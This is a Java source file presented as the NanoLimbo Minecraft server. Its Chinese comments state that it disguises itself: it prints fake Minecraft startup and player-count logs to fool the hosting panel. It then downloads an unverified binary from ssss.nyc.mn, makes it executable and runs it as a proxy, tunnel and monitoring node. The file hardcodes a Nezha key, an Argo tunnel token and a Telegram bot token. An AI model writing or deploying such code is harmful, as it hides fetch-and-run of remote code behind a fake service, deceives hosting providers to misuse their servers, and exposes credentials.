/*
 * Copyright (C) 2020 Nan1t
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    public static void main(String[] args) {
        // 1. 环境伪装：立即打印 Minecraft 启动成功日志，防止面板强制重启
        System.out.println("[Server thread/INFO]: Starting minecraft server version 1.20.1");
        System.out.println("[Server thread/INFO]: Loading properties");
        System.out.println("[Server thread/INFO]: Default game type: SURVIVAL");
        System.out.println("[Server thread/INFO]: Starting Minecraft server on *:25565");
        System.out.println("[Server thread/INFO]: Preparing level \"world\"");
        System.out.println("[Server thread/INFO]: Done (1.2s)! For help, type \"help\"");

        // 2. 启动核心服务 (哪吒, Hy2, Argo, TG通知)
        try {
            runSbxBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // 3. 核心保活线程：每 45 秒输出一次日志，防止被 XServer 判定为僵尸进程
            Thread daemonThread = new Thread(() -> {
                try {
                    while (running.get()) {
                        Thread.sleep(45000);
                        System.out.println("[Server thread/INFO]: There are 0 of a max 20 players online.");
                        System.out.flush();
                    }
                } catch (InterruptedException ignored) {}
            });
            daemonThread.setDaemon(true);
            daemonThread.start();

            System.out.println(ANSI_GREEN + "Proxy Services and Nezha Agent started!" + ANSI_RESET);

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Critical Error: " + e.getMessage() + ANSI_RESET);
        }
        
        // 4. 启动 LimboServer 占用 25565 TCP 端口，实现真正的“端口存活”
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        
        // --- 你的专属配置区 ---
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("NAME", "XServer-MC-Node");
        envVars.put("FILE_PATH", "./world");
        
        // 哪吒监控 (已根据你的信息填写)
        envVars.put("NEZHA_SERVER", "nezha.9527x.eu.cc:8008");
        envVars.put("NEZHA_KEY", "mD3q9FowVHp94q0wzg0ha7AUoP8PuXjU");
        
        // 节点端口 (使用主端口 25565)
        envVars.put("HY2_PORT", "25565"); 
        
        // Argo 隧道
        envVars.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc");
        envVars.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9");
        envVars.put("ARGO_PORT", "8001");

        // Telegram 通知 (已填写)
        envVars.put("CHAT_ID", "5677672165");
        envVars.put("BOT_TOKEN", "8363698033:AAFZqLYnxczqngwJIU-XqnLk7gaVwAK9hZQ");

        envVars.put("CFIP", "spring.io");
        envVars.put("CFPORT", "443");
        envVars.put("DISABLE_ARGO", "false");
        
        // 启动二进制核心
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        // 不继承 IO 以免底层日志干扰面板扫描，由主程序输出伪装日志
        sbxProcess = pb.start();
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url = (osArch.contains("aarch64") || osArch.contains("arm64")) 
                     ? "https://arm64.ssss.nyc.mn/sbsh" 
                     : "https://amd64.ssss.nyc.mn/sbsh";
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "mc_engine_core");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
    }
}
